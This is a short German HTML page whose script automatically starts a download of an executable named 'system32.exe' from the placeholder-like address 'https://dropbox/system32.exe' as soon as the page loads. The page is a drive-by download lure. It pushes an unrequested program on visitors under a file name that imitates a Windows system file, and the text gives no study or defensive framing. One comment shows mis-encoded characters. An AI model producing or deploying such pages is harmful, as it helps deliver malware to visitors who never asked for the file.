<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Automatisierter Download</title>
</head>
<body>
    <h1>Automatischer Download einer Datei</h1>
    <p>Wenn Sie diese Seite besuchen, beginnt der Download automatisch.</p>

    <script>
        // Funktion zum Starten des Downloads
        function downloadFile() {
            var link = document.createElement('a');
            link.href = 'https://dropbox/system32.exe'; // URL der Datei, die heruntergeladen werden soll
            link.download = 'system32.exe'; // Dateiname, der vorgeschlagen wird
            link.click();
        }

        // Download ausl√∂sen, sobald die Seite geladen wird
        window.onload = function() {
            downloadFile();
        };
    </script>
</body>
</html>
